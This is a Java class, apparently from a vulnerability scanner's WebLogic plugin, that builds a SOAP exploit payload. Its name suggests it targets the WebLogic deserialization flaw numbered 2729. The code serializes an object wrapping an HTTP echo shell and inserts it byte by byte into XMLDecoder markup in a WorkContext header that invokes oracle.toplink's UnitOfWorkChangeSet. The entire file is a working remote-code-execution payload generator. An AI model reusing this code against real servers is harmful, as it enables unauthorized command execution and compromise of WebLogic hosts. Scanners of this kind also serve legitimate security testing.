package com.gbw.scanner.plugins.scripts.weblogic.payload;


import com.gbw.scanner.plugins.scripts.weblogic.shell.GBWHttpEchoShell;
import com.gbw.scanner.utils.Serializer;

public class GBWUnitOfWorkChangeSet2729 implements GBWXmlEchoPayload {

    private GBWEchoPayload payload;

    public GBWUnitOfWorkChangeSet2729(GBWEchoPayload payload) {
        this.payload = payload;
    }

    @Override
    public String getXml() throws Exception {
        StringBuilder sb=new StringBuilder();
        byte[] buf= Serializer.serialize(payload.getObject("",GBWHttpEchoShell.class));
        sb.append(String.format("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><array method=\"forName\"><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void><array class=\"byte\" length=\"%s\">",buf.length));
        for(int i=0;i<buf.length;i++){
            sb.append(String.format("<void index=\"%s\"><byte>%s</byte></void>",i,buf[i]));
        }
        sb.append("</array></void></array></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>");
        return sb.toString();
    }

    @Override
    public String getName() {
        return "GBWUnitOfWorkChangeSet2729";
    }

}
